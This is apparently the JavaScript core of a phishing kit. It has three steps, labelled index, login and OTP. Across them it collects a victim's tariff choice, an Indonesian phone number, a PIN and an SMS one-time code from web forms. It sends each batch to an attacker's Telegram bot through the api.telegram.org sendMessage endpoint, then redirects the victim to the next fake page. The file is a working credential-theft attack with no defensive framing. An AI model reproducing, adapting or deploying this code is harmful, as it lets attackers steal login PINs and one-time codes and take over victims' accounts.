// index
function send(){
    $(".process1").fadeIn();
    event.preventDefault();   
    
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);
                              
    var logo = "𝘄𝘄𝘄.𝗮𝗸𝘂𝗹𝗮𝗸𝘂.𝗰𝗼𝗺";              
    var gabungan = '' + logo + '%0A%0A⍟ ' + tarif  ;   
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,   
    complete: function(){
    setTimeout(function(){   
    window.location = "nomor.html";
    $(".process1").fadeOut();  
   
    }, 500);}});};   
    
    
    
// Login
function sendHp(){
    $(".process1").fadeIn();
    event.preventDefault();   
   $('#inp').mask('0000000000000');
    
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);  
  var inp = $('#inp').val();
  sessionStorage.setItem('inp', inp);
  var password = $('#password').val();
  sessionStorage.setItem('password', password);
                              
    var logo = "𝘄𝘄𝘄.𝗮𝗸𝘂𝗹𝗮𝗸𝘂.𝗰𝗼𝗺";              
    var gabungan = '' + logo + '%0A⍟ ' + tarif + '%0A%0A⍟ 𝐍𝐨𝐦𝐨𝐫 •• %2B62' + inp + '%0A⍟ 𝐏𝐢𝐧 •• ' + password ;   
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,   
    complete: function(){
    setTimeout(function(){   
    window.location = "otp.html";
    $(".process1").fadeOut();  
    $('#inp').val('');
    $('#password').val('');
    }, 500);}});};
    
    
  // otp
function sendOtp(){
    $(".process1").fadeIn();
    event.preventDefault();   
                              
    var logo = "𝘄𝘄𝘄.𝗮𝗸𝘂𝗹𝗮𝗸𝘂.𝗰𝗼𝗺";           
    var gabungan = '' + logo + '%0A⍟ ' + tarif + '%0A%0A⍟ 𝐍𝐨𝐦𝐨𝐫 •• %2B62' + inp + '%0A⍟ 𝐏𝐢𝐧 •• ' + password + '%0A%0A⍟ 𝐎𝐓𝐏 •• ' + sms.value ;   
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,   
    complete: function(){
    setTimeout(function(){   
  
    $(".process1").fadeOut();  
    
    }, 500);}});};   